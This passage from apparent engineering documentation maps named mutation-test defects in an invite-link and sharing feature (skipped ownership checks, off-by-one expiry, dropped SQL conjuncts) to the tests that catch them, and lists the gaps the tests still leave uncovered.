| revoked link redeemable | `invite-teamlink-revoke-stops-closing` | `TestARevokedLinkIsNotRedeemable` |
| expired link redeemable (boundary) | `invite-teamlink-expiry-stops-closing-at-the-boundary` | `TestAnExpiredLinkIsNotRedeemable` |
| joins a target not selected | `ui-teamlink-scope-target-joins-its-whole-project` | `TestARedemptionJoinsExactlyTheSelectedTargets` |
| revoke by a non-owner | `ui-teamlink-revoke-skips-the-ownership-check` | `TestOnlyTheMinterCanRevokeALink` |
| owner demoted by a member link | `ui-teamlink-overwrites-an-existing-membership` | `TestALinkNeverOverwritesAnExistingMembership` |
| reuse box ignored | `ui-teamlink-reuse-tick-is-ignored` | `TestTheTeamLinkFormPassesEveryTickedTargetThrough` |
| narrowed token offered targets | `ui-team-page-offers-the-unnarrowed-principals-targets` | `TestANarrowedBearerHasNoTeamLinkAuthority` (+ledger) |
| narrowed token mints | `ui-team-mint-acts-as-the-unnarrowed-principal` | `TestANarrowedBearerHasNoTeamLinkAuthority` (+ledger) |
| notice drops the reuse clause | `ui-team-honesty-notice-loses-its-reuse-clause` | `TestTheTeamHonestyNoticeIsPinnedWhole` |
| 🟡1 log confirmed at the spend | `ui-teamlink-log-confirms-before-the-authority-write` | `TestTheRedemptionLogNamesOnlyRealJoins` |
| 🟡1 unconfirmed row shown as a join | `ui-team-log-renders-an-unconfirmed-row-as-a-join` | `TestTheRedemptionLogNamesOnlyRealJoins` (+1) |
| 🟡3/O-b project-wide grants off the take-back list | `ui-share-revocable-drops-project-wide-grants` | `TestAProjectWideGrantIsListedLabelledAndRevocable` |
| 🟡3 audience loses "via a project-wide grant" | `ui-share-audience-loses-the-project-wide-label` | `TestAProjectWideGrantIsListedLabelledAndRevocable` |
| O-b project-wide grant not revocable | `ui-unshare-refuses-every-project-wide-grant` | `TestAProjectWideGrantIsListedLabelledAndRevocable` |
| O-b narrowed revoke of a project-wide grant | `ui-unshare-project-grant-ignores-the-narrowing` | `TestANarrowedBearerCannotRevokeAProjectWideGrant` (+1) |
| O-b plain member revokes a project-wide grant | `ui-unshare-project-grant-for-any-member` | `TestAProjectWideGrantIsListedLabelledAndRevocable` |
| O-a `/share` redirect drops its query | `ui-old-share-path-drops-its-query` | `TestTheOldFlowPathsRedirectToTheTeamPage` |
| O-a old invite code read as the share banner | `ui-old-invite-path-keeps-the-pre-move-code` | `TestTheOldFlowPathsRedirectToTheTeamPage` |
| O-a redirect gains an HTML body (no `no-store`) | `ui-team-redirect-gains-an-html-body` | `TestEveryNonPublicHTMLRowIsNoStore` |
| D2/🟡4 half-wired server builds | `ui-inviting-without-links-builds` | `TestAnInvitationHalfWithoutTeamLinksIsRefused` |
| 🟡4 `main` drops the link store | `main-drops-the-link-store-from-the-invitation-half` | `TestTheWiredInvitationHalfRedeemsATeamLink` |
| 🟢5 blank project/role on a link's log line | `ui-link-log-line-loses-the-link` | `TestALinkRedemptionLogLineNamesTheLink` |
| round 2 🟡A Revoke offered where the write refuses | `ui-revoke-form-rendered-without-mayrevokegrant` | `TestARevokeFormIsRenderedOnlyWhereTheRevokeWouldBeAuthorised` |
| round 2 🟡A project named to an outsider | `ui-project-wide-row-names-its-project-to-outsiders` | `TestARevokeFormIsRenderedOnlyWhereTheRevokeWouldBeAuthorised` |

Eight pre-existing rows were RE-DERIVED (same names, same defects) because the code they mutate
moved — the share/invite page handlers into section builders, `Unshare`'s check into
`mayRevokeGrant`, the mint's render onto the Team page, the header's invite link into the one Team
link — and `ui-ring-row-declared-public`'s pattern is unchanged because the route table's alignment
was kept.

SQL half (Postgres tier, scratch copies): the expiry guard opened to `>=`, the single-use conjunct
dropped, the revoked conjunct dropped, the CHECK constraint dropped, a revoke of a spent single-use
link reported as success, and a migration 2 that destroys version-1 rows — each RED in the team-link
test that names it. The rollback test's own positive control asserts the hazard exists (an older
build refuses a version-2 database) before asserting the recipe lifts it.

## What these guards still cannot see

- **A real provider.** The seam tests drive the real dispatcher, flight, `ControlInviting` and
  `ControlTeamLinks` with a STUBBED exchange; no real GoTrue has redeemed a team link.
- **The mint forms in a browser.** They need `-db-dsn`; `uiaudit` captures the no-database Team page
  only (the invite mint form's existing gap, Q10).
- **Rate.** Nothing limits how fast one reusable link enrols; only the flight caps bound it, and no
  test drives a reusable link at volume.
- **A revoke racing a redemption**, and two simultaneous mints — the store's conditional statements
  are the argument; neither race is driven.
- **An access log.** The `/join` query-string residual above is a deployment fix outside this repo.
- **A real rollback.** The recipe is measured through the startup predicate on one schema, not by
  booting an older image against a production-shaped database.
